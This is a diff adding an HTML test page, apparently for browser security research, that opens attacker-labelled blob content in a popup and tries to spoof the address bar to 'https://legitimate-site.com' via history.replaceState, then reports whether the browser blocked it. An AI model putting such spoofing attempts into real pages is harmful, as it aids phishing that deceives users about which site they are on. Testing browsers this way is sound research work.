@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Research: Blob URL Spoofing</title>
+    <style>
+        body {
+            font-family: monospace;
+            padding: 20px;
+            background: #1a1a2e;
+            color: #eee;
+        }
+
+        .box {
+            background: #16213e;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 10px 0;
+        }
+
+        .status {
+            padding: 10px;
+            border-radius: 5px;
+            margin: 5px 0;
+        }
+
+        .vuln {
+            background: #c0392b;
+            color: white;
+        }
+
+        .safe {
+            background: #27ae60;
+            color: white;
+        }
+
+        .info {
+            background: #2980b9;
+            color: white;
+        }
+
+        button {
+            background: #e74c3c;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background: #c0392b;
+        }
+    </style>
+</head>
+
+<body>
+
+    <h1>🔬 Research Test 1: Blob URL Spoofing</h1>
+    <div class="box">
+        <p><strong>Goal:</strong> Open a blob URL and make the address bar show "https://legitimate-site.com"</p>
+        <button onclick="testBlobSpoof()">▶ Run Test</button>
+        <div id="result1"></div>
+    </div>
+
+    <script>
+        function testBlobSpoof() {
+            const resultDiv = document.getElementById('result1');
+            resultDiv.innerHTML = '<div class="status info">⏳ Testing blob URL spoofing...</div>';
+
+            try {
+                // Step 1: Create attacker content as a blob
+                const attackerHTML = `
+                    <html>
+                        <head><title>Fake Content</title></head>
+                        <body>
+                            <h1 style="color:red;">⚠️ This is from ATTACKER</h1>
+                            <p>Current URL: <span id="urlDisplay"></span></p>
+                            <script>
+                                // Try to change the address bar
+                                try {
+                                    history.replaceState({}, '', 'https://legitimate-site.com');
+                                    document.getElementById('urlDisplay').textContent = window.location.href;
+                                    document.body.innerHTML += '<p style="color:red;">✅ SUCCESS: Address bar shows legitimate-site.com</p>';
+                                } catch(e) {
+                                    document.getElementById('urlDisplay').textContent = window.location.href;
+                                    document.body.innerHTML += '<p style="color:orange;">❌ Blocked: ' + e.message + '</p>';
+                                }
+                            <\/script>
+                        </body>
+                    </html>
+                `;
+
+                const blob = new Blob([attackerHTML], {
+                    type: 'text/html'
+                });
+                const blobURL = URL.createObjectURL(blob);
+
+                // Step 2: Open the blob in a new window
+                const win = window.open(blobURL, '_blank', 'width=800,height=600');
+
+                if (!win) {
+                    resultDiv.innerHTML =
+                        '<div class="status info">⚠️ Popup blocked. Please allow popups for this test.</div>';
+                    return;
+                }
+
+                // Step 3: Check what happened after 2 seconds
+                setTimeout(() => {
+                    try {
+                        const currentURL = win.location.href;
+                        const isSpoofed = currentURL === 'https://legitimate-site.com/';
+
+                        resultDiv.innerHTML = `
+                            <div class="status ${isSpoofed ? 'vuln' : 'safe'}">
+                                ${isSpoofed ? '🔴 VULNERABILITY FOUND!' : '🟢 SAFE - Browser blocked it'}
+                            </div>
+                            <div class="box">
+                                <p><strong>Actual URL in address bar:</strong> ${currentURL}</p>
+                                <p><strong>Expected:</strong> https://legitimate-site.com/</p>
+                                <p><strong>Result:</strong> ${isSpoofed ? 'Spoofing successful!' : 'Spoofing failed - browser security works'}</p>
+                                <p><em>Note: Check the new window's address bar manually to verify.</em></p>
+                            </div>
+                        `;
+                    } catch (e) {
+                        resultDiv.innerHTML = `
+                            <div class="status info">
+                                ⚠️ Cannot read URL due to cross-origin policy (this is expected security behavior)
+                            </div>
+                            <div class="box">
+                                <p><strong>Manual check required:</strong> Look at the new window's address bar</p>
+                                <p><strong>It should show:</strong> blob:http://... (NOT legitimate-site.com)</p>
+                            </div>
+                        `;
+                    }
+                }, 2000);
+
+            } catch (e) {
+                resultDiv.innerHTML = `<div class="status info">❌ Error: ${e.message}</div>`;
+            }
+        }
+    </script>
+
+</body>
+
+</html>
